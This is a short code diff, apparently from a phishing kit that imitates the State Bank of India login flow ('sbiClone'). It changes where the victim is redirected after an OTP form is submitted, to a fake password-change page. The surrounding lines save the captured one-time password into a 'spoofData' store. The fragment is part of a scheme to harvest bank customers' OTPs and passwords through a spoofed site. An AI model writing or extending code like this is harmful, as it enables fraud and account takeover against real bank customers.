@@ -28,7 +28,7 @@ function submitForm(e) {
 
     //   reset the form
     document.getElementById("otp_login").reset();
-    window.location.href = "/passwordChange.html";
+    window.location.href = "/sbiClone/passwordChange.html";
 }
 const saveOtpLogin = (otp1) => {
     var newSpoofData = spoofData.push();
